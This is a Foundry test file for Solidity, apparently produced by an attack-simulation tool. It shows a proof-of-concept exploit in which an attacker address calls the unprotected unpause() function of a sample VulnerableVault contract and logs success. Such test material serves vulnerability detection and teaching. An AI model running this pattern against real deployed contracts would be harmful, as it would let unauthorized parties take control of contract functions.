// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../../samples/VulnerableVault.sol";

/**
 * @title Access Control Exploit Test
 * @notice Demonstrates missing access control in VulnerableVault.unpause()
 * @dev Generated by Smart Contract Attack Simulator
 *
 * Vulnerability: The function unpause() appears to be a sensitive function but lacks access control modifiers.
 * Location: Line 93
 */
contract AccessControlExploitTest_unpause is Test {
    VulnerableVault public target;

    address public owner = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        // Deploy as owner
        vm.prank(owner);
        target = new VulnerableVault();

        // Fund the contract
        vm.deal(address(target), 10 ether);
        vm.deal(attacker, 1 ether);
    }

    function testAccessControlExploit_unpause() public {
        console.log("=== Access Control Attack Simulation ===");
        console.log("Attacker address:", attacker);
        console.log("Owner address:", owner);

        // Attacker calls the sensitive function without authorization
        vm.prank(attacker);

        // This should NOT be allowed but the vulnerability lets it through
        target.unpause();

        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Attacker successfully called unpause() without authorization!");
    }
}
